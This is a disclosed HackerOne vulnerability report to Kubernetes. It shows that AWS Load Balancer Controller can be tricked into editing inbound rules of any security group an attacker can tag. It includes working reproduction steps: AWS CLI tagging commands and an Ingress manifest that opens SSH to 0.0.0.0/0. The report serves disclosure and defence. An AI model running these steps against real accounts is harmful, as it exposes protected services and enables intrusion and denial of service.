# AWS Load Balancer Controller can be used by an attacker to modify rules of any Security Group that they are able to tag

## Report Details
- **Report ID**: 1238482
- **URL**: https://hackerone.com/reports/1238482
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-06-19T22:14:27.232Z
- **Disclosed**: 2022-06-02T00:49:36.613Z

## Reporter
- **Username**: t0rr3sp3dr0
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: kubernetes

## Vulnerability Information
Report Submission Form

## Summary:
The IAM Policy of AWS Load Balancer Controller allows it to modify rules of any SG on the AWS Account. This is legitimately used to manage Security Groups created by the controller when an Ingress resource doesn’t explicit a SG. Annotations can be added to the Ingress to change inbound rules of the managed SG.

An attacker with access to some namespace on a K8s cluster with AWS Load Balancer Controller properly installed and configured, is able to trick the controller into modifying rules of any SG that the attacker is able to tag.

AWS Load Balancer Controller uses three tags to associate a SG on AWS to the supposed managed SG created for an ALB: `elbv2.k8s.aws/cluster`, `ingress.k8s.aws/stack`, and `ingress.k8s.aws/resource`. When there are multiple SGs that match the expected tag values, the controller attaches the first one returned by the AWS SDK to the ALB and deletes the other ones. The API call returns SGs sorted by their respective ids.

If an arbitrary SG is tagged with the values expected by AWS Load Balancer Controller for some Ingress before its creation, as soon the Ingress is created the controller thinks that the targeted SG is a managed one. This allows an attacker to use annotations `alb.ingress.kubernetes.io/listen-ports` and `alb.ingress.kubernetes.io/inbound-cidrs` on the Ingress resource to modify inbound rules of unmanaged SGs, what should not be possible.

## Kubernetes Version:
version.Info{Major:"1", Minor:"20+", GitVersion:"v1.20.4-eks-6b7464", GitCommit:"6b746440c04cb81db4426842b4ae65c3f7035e53", GitTreeState:"clean", BuildDate:"2021-03-19T19:33:03Z", GoVersion:"go1.15.8", Compiler:"gc", Platform:"linux/amd64"}

## Component Version:
AWS Load Balancer Controller v2.2.0

## Steps To Reproduce:

```bash
VPC_ID=vpc-00123456789abcdef
CLUSTER_NAME=kind

# Developer legitimatly creates a security group to protect some service
UNMANAGED_SG_ID=$(aws ec2 create-security-group --description unmanaged-sg --group-name unmanaged-sg --vpc-id ${VPC_ID} | jq -r .GroupId)

# Attacker tags the unmanaged security group with values expected by the AWS Load Balancer Controller
aws ec2 create-tags --resources ${UNMANAGED_SG_ID} --tags "Key=elbv2.k8s.aws/cluster,Value=${CLUSTER_NAME}" "Key=ingress.k8s.aws/stack,Value=echoserver/echoserver" "Key=ingress.k8s.aws/resource,Value=ManagedLBSecurityGroup"

# Attacker creates an Ingress with a combination of name, namespace, and cluster that matches the tags added to the unmanaged SG
# listen-ports and inbound-cidrs annotations are set with values related to the inbound rule that will be created on the security group
aws eks update-kubeconfig --name ${CLUSTER_NAME}
cat <<- EOF | kubectl apply -f -
apiVersion: v1
kind: Service
metadata:
  namespace: echoserver
  name: echoserver
spec:
  selector:
    app: echoserver
  ports:
    - name: http
      protocol: TCP
      port: 8080
---
apiVersion: extensions/v1beta1
kind: Ingress
metadata:
  namespace: echoserver
  name: echoserver
  annotations:
    kubernetes.io/ingress.class: alb
    alb.ingress.kubernetes.io/target-type: ip
    alb.ingress.kubernetes.io/listen-ports: '[{"HTTP":22}]'
    alb.ingress.kubernetes.io/inbound-cidrs: 0.0.0.0/0
spec:
  rules:
    - host: echoserver.example.com
      http:
        paths:
          - backend:
              serviceName: echoserver
              servicePort: 8080
EOF
sleep 15

# Inbound rules were created on the unmanaged security group, allowing ingress SSH traffic (TCP Port 22) from anywhere (CIDR 0.0.0.0/0)
aws ec2 describe-security-groups --group-id ${UNMANAGED_SG_ID}
```

## Impact

An attacker is capable of gaining access to all network resources protected by some Security Group and is also able to expose critical services to the Internet if they are on a public subnet. A denial of service attack can be performed by blocking traffic of legitimate clients to resources with SGs attached.

## Attachments
No attachments
